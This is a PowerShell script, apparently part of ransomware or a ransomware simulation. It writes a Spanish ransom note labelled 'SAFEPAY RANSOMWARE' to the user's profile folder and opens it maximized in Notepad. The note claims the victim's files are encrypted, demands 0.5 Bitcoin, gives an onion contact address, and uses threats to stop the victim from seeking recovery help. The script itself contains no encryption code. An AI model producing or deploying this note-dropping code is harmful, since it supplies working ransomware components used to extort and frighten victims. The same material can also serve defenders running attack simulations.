# $session = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty UserName
# $public  = $env:PUBLIC
# $parent = Split-Path -Path $public -Parent
# $instruccion = "Instrucciones.txt"
# $fullPath = Join-Path -Path $parent -ChildPath $instruccion
# Start-Process $fullPath
# if ($session) {
#     Start-Process -FilePath "notepad.exe" -ArgumentList $fullPath -NoNewWindow
# } else {
#     Write-Output "No hay usuario logueado"
# }

# get current profile
$profile  = $env:USERPROFILE
$message = @"
=================================================================
                    SAFEPAY RANSOMWARE
=================================================================
¡Todos sus archivos han sido encriptados! :(

Sus archivos, así como los datos de la empresa almacenados en esta computadora, han sido cifrados con un algoritmo de grado militar. La clave de descifrado privada se encuentra en un servidor secreto y nadie puede recuperar la información sin pagar por ella.

¿QUÉ SUCEDIÓ?
Sus documentos, fotos, videos, bases de datos y otra información importante ya no son accesibles. No pierda tiempo buscando una solución, ya que solo nuestro servicio de descifrado puede recuperar sus archivos.

¿CÓMO RECUPERAR LOS ARCHIVOS?
Para recuperar sus archivos, debe realizar un pago de 0.5 Bitcoin a la siguiente dirección:
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

Una vez realizado el pago, envíe el ID de su computadora a: safepay@darkweb.onion

Su ID de computadora: 682298

¡ADVERTENCIAS! 

No intente descifrar los archivos por su cuenta.

No contacte a empresas de recuperación de datos.

No reinicie ni reinstale el sistema operativo.

Sus archivos se perderán permanentemente si no sigue estas instrucciones.

Tiene 72 horas para realizar el pago
"@
$path = Join-Path -Path $profile -ChildPath "Instrucciones.txt"
echo $message | Out-File -FilePath $path  -Encoding UTF8
try{
if (Test-path $path) {
Start-Process "notepad.exe" -ArgumentList $path -WindowStyle Maximized
}else{
    Write-Output "No se pudo crear el archivo"
}
}catch{
    Write-Output "Error al abrir el archivo"
}